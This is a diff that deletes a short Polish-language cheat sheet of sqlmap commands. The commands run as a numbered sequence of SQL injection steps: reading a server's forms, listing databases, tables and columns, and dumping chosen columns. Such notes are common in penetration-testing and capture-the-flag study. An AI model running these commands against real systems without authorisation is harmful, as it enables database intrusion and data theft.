@@ -1,8 +1,0 @@
-
-[Fajna metoda dzialania]
-# Examples 
-	0. sqlmap --url <ip> --forms (taki zapis sam zczyta z servera formularz)
-	1. Odkrywamy nazwe bazydanych 		(sqlmap -r <file> --dbs)
-	2. Odkrywamy nazwe tabeli 				(sqlmap -r <file> --current-db <name> --tables)
-	3. Odkrywamy nazwe kolumn 			(sqlmap -r <file> --current-db <name> -T <table name> --columns)
-	4. Zrzut tabeli										(sqlmap -r <file> --current-db <name> -T <table name> -C kolumn1,kolumn2 --dump)
